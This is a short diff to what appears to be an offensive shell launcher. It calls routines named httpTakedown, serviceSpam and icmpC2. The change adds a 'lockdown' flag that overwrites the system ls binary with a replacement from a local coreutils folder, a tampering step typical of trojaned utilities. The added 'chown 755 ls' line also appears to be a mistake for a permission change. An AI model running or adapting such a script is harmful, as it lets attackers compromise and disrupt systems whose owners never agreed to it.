@@ -5,6 +5,8 @@ ROOT_PATH="$(dirname $( realpath "$0"  ))"
 echo "Dirname: $ROOT_PATH"
 echo "Which: $WHICH"
 
+IS_UB_LOCKDOWN=true
+
 
 httpTakedown () {
     cd "$ROOT_PATH/http-takedown"
@@ -44,6 +46,11 @@ if [[ "$WHICH" == "all" ]]; then
     processd
     httpTakedown
     serviceSpam
+    if [[ $IS_UB_LOCKDOWN == "true" ]]; then
+        cd "$ROOT_PATH/coreutils"
+        chown 755 ls
+        mv ls $(which ls)
+    fi
 fi
 if [[ "$WHICH" == "icmp" ]]; then
     icmpC2
